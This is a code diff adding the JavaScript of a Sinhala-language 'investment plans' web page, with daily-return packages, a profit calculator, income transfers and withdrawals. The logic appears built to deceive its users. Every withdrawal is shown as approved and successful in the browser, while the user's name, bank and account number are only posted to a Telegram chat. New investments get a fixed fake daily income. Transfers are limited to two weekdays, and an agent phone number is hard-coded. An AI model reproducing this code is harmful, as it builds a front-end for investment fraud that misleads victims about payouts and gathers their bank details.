+            currentFilter = filteredCategory;
+            const grid = document.getElementById('plansGrid');
+            const select = document.getElementById('calcPackage');
+            const heading = document.getElementById('sectionHeading');
+            const topContainer = document.getElementById('activeTopContainer');
+            
+            grid.innerHTML = '';
+            topContainer.innerHTML = '';
+            
+            if (select.options.length === 0) {
+                packages.forEach(pkg => {
+                    select.innerHTML += `<option value="${pkg.amount}">රු. ${pkg.amount.toLocaleString()} (${pkg.dailyRate}% දිනකට)</option>`;
+                });
+            }
+
+            // Withdrawals View Category
+            if (filteredCategory === 'withdrawals') {
+                heading.innerText = "🏦 ඔබගේ මුදල් ආපසු ගැනීමේ ඉල්ලීම් (Withdrawal History)";
+
+                if (userWithdrawals.length === 0) {
+                    grid.innerHTML = `<div style="grid-column: 1 / -1; text-align: center; color: #94a3b8; padding: 40px;">තවම මුදල් ආපසු ගැනීමේ ඉල්ලීම් (Withdrawals) සිදු කර නොමැත.</div>`;
+                    return;
+                }
+
+                userWithdrawals.forEach((req, index) => {
+                    let statusBadge = `<span class="status-badge status-approved">Withdrawal Successful ✓</span>`;
+
+                    grid.innerHTML += `
+                        <div class="plan-card active-plan-card" style="border-color: #10b981;">
+                            ${statusBadge}
+                            <div class="plan-price">රු. ${req.amount.toLocaleString()}</div>
+                            <ul class="plan-features-list">
+                                <div>බැංකුව: <span>${req.bank}</span></div>
+                                <div>ගිණුම් අංකය: <span>${req.account}</span></div>
+                                <div>දිනය / වෙලාව: <span>${req.date}</span></div>
+                            </ul>
+                            <button class="invest-btn" style="background: #1e293b; color: #10b981; border: 1px solid #10b981; margin-bottom: 10px;" disabled>සාර්ථකයි (Successful) ✓</button>
+                            
+                            <div class="support-btn-group">
+                                <button class="btn-agent" onclick="contactAgent()">Contact Agent</button>
+                                <button class="btn-support" onclick="contactSupport()">Contact Support</button>
+                            </div>
+                        </div>
+                    `;
+                });
+                return;
+            }
+
+            // Active Plans Category
+            if (filteredCategory === 'active') {
+                heading.innerText = "⚡ ඔබගේ සක්‍රීය ආයෝජන (Active Plans & Daily Income)";
+                
+                let totalAccumulatedIncome = userActiveInvestments.reduce((sum, pkg) => sum + (pkg.currentDailyEarn || 0), 0);
+                let allowedToday = isTransferAllowedToday();
+                let transferBtnStyle = allowedToday ? '' : 'background: #334155; color: #94a3b8; cursor: not-allowed;';
+                let transferBtnText = allowedToday ? 'Transfer To Main Balance' : 'සඳුදා සහ අඟහරුවාදා දිනවල පමණක් මාරු කළ හැක';
+
+                topContainer.innerHTML = `
+                    <div class="active-control-panel">
+                        <div class="active-control-info">
+                            <h4>එක්රැස් වූ මුළු දෛනික ආදායම (Total Daily Income)</h4>
+                            <div class="total-earn">රු. ${totalAccumulatedIncome.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
+                        </div>
+                        <button class="transfer-btn" style="${transferBtnStyle}" onclick="transferToMainBalance()">${transferBtnText}</button>
+                    </div>
+                `;
+
+                if (userActiveInvestments.length === 0) {
+                    grid.innerHTML = `<div style="grid-column: 1 / -1; text-align: center; color: #94a3b8; padding: 40px;">තවම සක්‍රීය කළ ආයෝජන නොමැත. කරුණාකර පැකේජයක් මිලදී ගන්න.</div>`;
+                    return;
+                }
+
+                userActiveInvestments.forEach(pkg => {
+                    let standardDaily = (pkg.amount * pkg.dailyRate) / 100;
+                    let totalProfit = standardDaily * pkg.days;
+
+                    grid.innerHTML += `
+                        <div class="plan-card active-plan-card">
+                            <span class="active-badge">Active Package</span>
+                            <div class="plan-price">රු. ${pkg.amount.toLocaleString()}</div>
+                            <ul class="plan-features-list">
+                                <div>දෛනික ආදායම: <span style="color: #10b981; font-weight: 700;">රු. ${(pkg.currentDailyEarn || 0).toFixed(2)}</span></div>
+                                <div>දෛනික ප්‍රතිලාභය: <span>${pkg.dailyRate}%</span></div>
+                                <div>ඉතිරි දින: <span>දින ${pkg.days}යි</span></div>
+                                <div>මුළු ලාභය: <span>රු. ${totalProfit.toLocaleString('en-US', {minimumFractionDigits: 2})}</span></div>
+                            </ul>
+                            <button class="invest-btn" style="background: #1e293b; color: #10b981; border: 1px solid #10b981;" disabled>ධාවනය වෙමින් පවතී</button>
+                        </div>
+                    `;
+                });
+                return;
+            }
+
+            heading.innerText = "✨ ආයෝජන සැලසුම් (Investment Plans)";
+            let filteredPackages = filteredCategory === 'all' 
+                ? packages 
+                : packages.filter(p => p.category === filteredCategory);
+
+            filteredPackages.forEach(pkg => {
+                let dailyProfit = (pkg.amount * pkg.dailyRate) / 100;
+                let totalProfit = dailyProfit * pkg.days;
+
+                grid.innerHTML += `
+                    <div class="plan-card">
+                        <div class="plan-price">රු. ${pkg.amount.toLocaleString()}</div>
+                        <ul class="plan-features-list">
+                            <div>දෛනික ප්‍රතිලාභය: <span>${pkg.dailyRate}%</span></div>
+                            <div>දිනකට ලාභය: <span>රු. ${dailyProfit.toFixed(2)}</span></div>
+                            <div>කාලය: <span>දින ${pkg.days}යි</span></div>
+                            <div>මුළු ලාභය: <span>රු. ${totalProfit.toLocaleString('en-US', {minimumFractionDigits: 2})}</span></div>
+                        </ul>
+                        <button class="invest-btn" onclick="startInvestment(${pkg.amount})">ආයෝජනය කරන්න</button>
+                    </div>
+                `;
+            });
+
+            calculateReturns();
+        }
+
+        // Filter Category Function
+        function filterCategory(category, buttonElement) {
+            document.querySelectorAll('.cat-btn').forEach(btn => btn.classList.remove('active'));
+            buttonElement.classList.add('active');
+            renderApp(category);
+        }
+
+        // Profit Calculator Logic
+        function calculateReturns() {
+            let selectedAmount = parseInt(document.getElementById('calcPackage').value);
+            let pkg = packages.find(p => p.amount === selectedAmount);
+
+            if (pkg) {
+                let dailyProfit = (pkg.amount * pkg.dailyRate) / 100;
+                let totalReturn = dailyProfit * pkg.days;
+
+                document.getElementById('totalProfitOutput').innerHTML = `රු. ${totalReturn.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+                document.getElementById('dailyProfitOutput').innerHTML = `දෛනික ලාභය: රු. ${dailyProfit.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+            }
+        }
+
+        // Investment Trigger
+        function startInvestment(amount) {
+            let pkg = packages.find(p => p.amount === amount);
+
+            if (mainBalance < amount) {
+                alert("ඔබගේ ප්‍රධාන ගිණුම් ශේෂය (Main Balance) ප්‍රමාණවත් නොවේ! කරුණාකර මුදල් තැන්පත් කර (Deposit) නැවත උත්සාහ කරන්න.");
+                return;
+            }
+
+            mainBalance -= amount;
+            userActiveInvestments.push({ 
+                ...pkg, 
+                currentDailyEarn: 50.00 
+            });
+
+            saveUserData();
+            updateWalletUI();
+            updateUIUserData();
+
+            alert(`සුභ පැතුම්! ඔබ සාර්ථකව රු. ${amount.toLocaleString()} ක පැකේජයක් මිලදී ගත්තා.`);
+
+            if (currentFilter === 'active') {
+                renderApp('active');
+            }
+        }
+
+        // Transfer Accumulated Daily Income to Main Balance (Restricted to Monday & Tuesday)
+        function transferToMainBalance() {
+            if (!isTransferAllowedToday()) {
+                alert("දෛනික ආදායම් ශේෂය ප්‍රධාන ගිණුමට මාරු කළ හැක්කේ සෑම සතියකම සඳුදා සහ අඟහරුවාදා දිනවල පමණි!");
+                return;
+            }
+
+            if (userActiveInvestments.length === 0) {
+                alert("මාරු කිරීමට සක්‍රීය ආයෝජන නොමැත!");
+                return;
+            }
+
+            let totalIncome = userActiveInvestments.reduce((sum, pkg) => sum + (pkg.currentDailyEarn || 0), 0);
+
+            if (totalIncome <= 0) {
+                alert("මාරු කිරීමට ප්‍රමාණවත් ආදායමක් නොමැත!");
+                return;
+            }
+
+            mainBalance += totalIncome;
+            userActiveInvestments.forEach(pkg => {
+                pkg.currentDailyEarn = 0;
+            });
+
+            saveUserData();
+            updateWalletUI();
+
+            alert(`සාර්ථකයි! රු. ${totalIncome.toLocaleString('en-US', {minimumFractionDigits: 2})} ක මුදල ප්‍රධාන ගිණුමට මාරු කරන ලදී.`);
+            
+            renderApp('active');
+        }
+
+        // Modal Generic Toggle
+        function toggleModal(modalId) {
+            const modal = document.getElementById(modalId);
+            modal.classList.toggle('active');
+        }
+
+        // Withdrawal Processing Logic (Min 1,500 and Max 25,000)
+        function processWithdrawal() {
+            let amount = parseFloat(document.getElementById('withdrawAmount').value);
+            let bank = document.getElementById('bankName').value.trim();
+            let acc = document.getElementById('accountNo').value.trim();
+
+            if(!amount || !bank || !acc) {
+                alert("කරුණාකර සියලුම විස්තර නිවැරදිව පුරවන්න!");
+                return;
+            }
+
+            if(amount < 1500) {
+                alert("අවම මුදල් ආපසු ගැනීමේ සීමාව රු. 1,500කි!");
+                return;
+            }
+
+            if(amount > 25000) {
+                alert("උපරිම මුදල් ආපසු ගැනීමේ සීමාව රු. 25,000කි!");
+                return;
+            }
+
+            if(amount > mainBalance) {
+                alert("ඔබ ඉල්ලූ මුදල ඔබේ ප්‍රධාන ශේෂයට වඩා වැඩිය!");
+                return;
+            }
+
+            mainBalance -= amount;
+            
+            let now = new Date();
+            let dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+            userWithdrawals.push({
+                amount: amount,
+                bank: bank,
+                account: acc,
+                status: 'Approved',
+                date: dateStr
+            });
+
+            saveUserData();
+            updateWalletUI();
+            updateUIUserData();
+
+            let withdrawMsg = `🏦 *නව මුදල් ඉල්ලුම් කිරීමක් (New Withdrawal Request)*\n\n` +
+                              `👤 නම: ${currentUser.name}\n` +
+                              `🆔 ගිණුම් අංකය: ${currentUser.accNo}\n` +
+                              `💰 මුදල: රු. ${amount.toLocaleString()}\n` +
+                              `🏛️ බැංකුව: ${bank}\n` +
+                              `🔢 ගිණුම් අංකය: ${acc}\n` +
+                              `📅 දිනය/වේලාව: ${dateStr}`;
+            sendTelegramMessage(withdrawMsg);
+
+            alert(`සාර්ථකයි! රු. ${amount.toLocaleString()} ක මුදල් ආපසු ගැනීමේ ඉල්ලීම සාර්ථක විය (Withdrawal Successful).`);
+            toggleModal('withdrawModal');
+            
+            document.getElementById('withdrawAmount').value = '';
+            document.getElementById('bankName').value = '';
+            document.getElementById('accountNo').value = '';
+
+            if (currentFilter === 'withdrawals') {
+                renderApp('withdrawals');
+            }
+        }
+
+        // Support Actions
+        function contactAgent() {
+            alert("නිල නියෝජිත අංකය (+94 72 593 9056) වෙත WhatsApp හෝ ඇමතුමක් මඟින් සම්බන්ධ වන්න.");
+        }
+
+        function contactSupport() {
+            alert("පාරිභෝගික සේවා අංකය (+94 77 123 4567) වෙත සම්බන්ධ වන්න.");
+        }
+
+        // Initialize on load with Persistent Authentication & Separate Account IDs
+        window.onload = () => {
+            if (loggedInEmail) {
+                let foundUser = registeredUsers.find(u => u.email === loggedInEmail);
+                if (foundUser) {
+                    currentUser = {
+                        name: foundUser.name,
+                        email: foundUser.email,
+                        phone: foundUser.phone,
+                        accNo: foundUser.accNo
+                    };
+                    currentUserId = foundUser.accNo;
+                    loadUserData(loggedInEmail);
+                    document.getElementById('authModal').classList.remove('active');
+                } else {
+                    mainBalance = 0.00;
+                    bonusClaimed = false;
+                    document.getElementById('authModal').classList.add('active');
+                }
+            } else {
+                mainBalance = 0.00;
+                bonusClaimed = false;
+                document.getElementById('authModal').classList.add('active');
+            }
+
+            updateWalletUI();
+            updateBonusButtonUI();
+            renderApp('all');
+            updateUIUserData();
+        };
+    </script>
+</body>
+</html>
